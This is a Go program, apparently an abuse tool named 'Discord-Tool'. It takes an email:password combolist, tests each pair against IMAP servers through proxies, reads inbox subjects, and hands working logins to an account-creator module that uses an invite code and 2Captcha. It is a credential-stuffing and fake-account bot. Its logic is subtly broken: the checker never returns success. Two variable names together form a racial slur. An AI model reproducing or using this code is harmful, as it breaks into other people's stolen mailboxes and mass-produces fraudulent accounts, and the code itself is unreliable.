package main

import (
	Modules "Discord-Tool/Modules"
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"github.com/fatih/color"
)

var (
	blue         = color.New(color.FgBlue).SprintFunc()
	red          = color.New(color.FgRed).SprintFunc()
	yellow       = color.New(color.FgYellow).SprintFunc()
	green        = color.New(color.FgHiGreen).SprintFunc()
	magenta      = color.New(color.FgMagenta).SprintFunc()
	bbb          = color.New(color.FgHiRed).SprintFunc()
	cyan         = color.New(color.FgCyan).SprintFunc()
	threadid int = -1
)

func checker(username string, passowrd string, addr string) (bool, *client.Client) {
	select {
	case <-time.After(5 * time.Second):
		break
	}
	cone, err := client.DialTLS(addr, nil)
	if err != nil {
		Modules.Log(fmt.Sprintf("%s", err), "IMAP", "error")
		return false, nil
	}

	// Login
	if err := cone.Login(username, passowrd); err != nil {
		Modules.Log("invalid credentials or IMAP is disabled", "Auth", "bad")
		return false, nil
	}

	// List mailboxes
	mailboxes := make(chan *imap.MailboxInfo, 10)
	done := make(chan error, 1)
	go func() {
		done <- cone.List("", "*", mailboxes)
	}()

	if err := <-done; err != nil {
		Modules.Log(fmt.Sprintf("%s", err), "Err", "error")
		return false, nil
	}

	// Select INBOX
	mbox, err := cone.Select("INBOX", false)
	if err != nil {
		Modules.Log(fmt.Sprintf("%s", err), "Err", "error")
		return false, nil
	}
	// Get the last messages
	from := uint32(1)
	to := mbox.Messages
	if mbox.Messages > 999 {
		// We're using unsigned integers here, only substract if the result is > 0
		from = mbox.Messages - 999
	}
	seqset := new(imap.SeqSet)
	seqset.AddRange(from, to)

	messages := make(chan *imap.Message, 10)
	done = make(chan error, 1)
	go func() {
		done <- cone.Fetch(seqset, []imap.FetchItem{imap.FetchEnvelope}, messages)
	}()

	for msg := range messages {
		if strings.Contains(msg.Envelope.Subject, "Discord") {
			return false, nil
		}
	}

	return false, cone
}

func main() {
	Modules.Logo()
	maxNbConcurrentGoroutines := flag.Int("threads", 3, "the number of goroutines that are allowed to run concurrently")
	pass := flag.Bool("pass", false, "start program directly")
	timeout := flag.Duration("timeout", 30*time.Second, "Timeout of the checker")
	flag.Parse()
	fmt.Println(flag.Args())
	var op string
	if *pass != true {
		fmt.Fprintf(color.Output, "%s%s%s %s (%s/%s) ", blue("["), bbb("+"), blue("]"), color.HiCyanString("would u like to use default configs?"), green("Y"), color.HiRedString("n"))
		fmt.Scanln(&op)
	}

	// Classes
	var comboList string
	var invite string
	out := new(Modules.Reader)
	config, err := Modules.LoadConfiguration("Setting.json")
	names := new(Modules.Reader)
	names.File = "Files/Names.txt"
	names.Read()

	if strings.HasPrefix(strings.ToLower(op), "n") {
		fmt.Fprintf(color.Output, "%s%s%s Proxies File %s ", yellow("["), green("+"), yellow("]"), magenta(">>"))
		var filename string

		fmt.Scanf("%d\n", &filename)

		if err != nil {
			fmt.Println(err)
		}

		out.File = filename

		fmt.Fprintf(color.Output, "%s%s%s Combolist File %s ", yellow("["), green("+"), yellow("]"), magenta(">>"))
		fmt.Scanln(&comboList)

		fmt.Fprintf(color.Output, "%s%s%s Invite code %s ", yellow("["), green("+"), yellow("]"), magenta(">>"))
		fmt.Scanln(&invite)
	} else {
		comboList = config.Combolist
		invite = config.Invite
		out.File = config.ProxyFile
	}

	out.Read()

	jsonFile, err := os.Open("Files/Servers.json")
	// if we os.Open returns an error then handle it
	if err != nil {
		fmt.Println(err)
	}
	fmt.Fprintf(color.Output, "%s%s%s All files has Successfully loaded\n\n", yellow("["), green("+"), yellow("]"))
	// defer the closing of our jsonFile so that we can parse it later on
	defer jsonFile.Close()

	byteValue, _ := ioutil.ReadAll(jsonFile)

	var imaphost map[string]interface{}
	json.Unmarshal([]byte(byteValue), &imaphost)

	file, err := os.Open(comboList)
	if err != nil {
		log.Fatal("Failed to open combolist")

	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	concurrentGoroutines := make(chan struct{}, *maxNbConcurrentGoroutines)
	var wg sync.WaitGroup

	for scanner.Scan() {
		wg.Add(1)
		go func(i string) {
			defer wg.Done()
			concurrentGoroutines <- struct{}{}
			threadid++
			fmt.Println(threadid)
			combo := strings.Split(i, ":")
			if imaphost[strings.Split(combo[0], "@")[1]] == nil {
				<-concurrentGoroutines
				return
			}

			c1 := make(chan bool, 1)
			c2 := make(chan *client.Client, 1)

			go func() {
				nig, ger := checker(combo[0], combo[1], imaphost[strings.Split(combo[0], "@")[1]].(string))
				c1 <- nig
				c2 <- ger
			}()
			// Listen on our channel AND a timeout channel - which ever happens first.
			select {
			case res := <-c1:
				if res {
					wtf := <-c2
					fmt.Fprintf(color.Output, "%s%s%s Logged into %s\n", magenta("["), cyan("+"), magenta("]"), combo[0])
					Modules.Creator(wtf, out, names, combo, invite, config.TwoCaptcha)
					wtf.Logout()
				}
			case <-time.After(*timeout):
				Modules.Log(imaphost[strings.Split(combo[0], "@")[1]].(string)+" out of time", "Timeout", "bad")
			}
			<-concurrentGoroutines
		}(scanner.Text())
	}
	wg.Wait()
}